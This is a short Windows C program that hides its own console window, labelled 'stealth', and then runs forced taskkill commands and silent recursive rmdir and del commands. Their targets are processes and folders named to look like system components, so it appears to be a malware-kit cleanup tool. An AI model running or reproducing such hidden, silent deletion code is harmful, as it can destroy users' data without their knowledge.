#include <stdio.h>
#include <stdlib.h>
#include <windows.h>



int main(){

    HWND stealth;
    AllocConsole();
    stealth = FindWindow("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);


    system("Taskkill /IM sys32.exe /F");
    system("taskkill /IM Win32.exe /F");
    system("taskkill /IM system32.exe /F");
    system("rmdir /S /Q System");
    system("rmdir /S /Q WIN32");
    system("del /f /q zdo.exe");
    return 0;
}
